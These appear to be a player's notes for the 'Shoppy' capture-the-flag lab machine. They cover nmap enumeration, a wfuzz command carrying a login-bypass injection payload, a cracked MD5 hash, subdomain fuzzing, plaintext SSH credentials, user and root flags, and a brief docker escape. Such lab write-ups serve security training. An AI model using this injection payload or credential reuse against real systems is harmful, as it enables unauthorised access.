IP: 10.10.11.180
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/shoppy 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-09 23:34 EST
Nmap scan report for 10.10.11.180
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hostname: shoppy.htb

Login page at shoppy.htb/login
sql auth bypass. which can enumerate users.
```bash
wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ'||'1==1&password=password" --hh 51 http://shoppy.htb/login
```
Found 2 valid users.
Josh and admin.

You can get the user's hashes. from the search button on the website.
josh:6ebcea65320589ca4f2f1ce039975995
Looks like a md5sum.

this cracks to remembermethisway

Check for subdomains.
```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomain-top100000.txt --hh 169 -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb"
```
Result of mattermost.

This is a login page which has creds in a msg.

jaeger:Sh0ppyBest@pp!
ssh onto the box: 
User flag: `00205ca0b36ca0c118f497536ca0d354`

Check sudo -l 
cat the file.
create a new user.
```bash
su -u <username>
```
As it is a docker instance do a docker escape to root.
root flag: `981640e1702857397b42e654b62d6423`
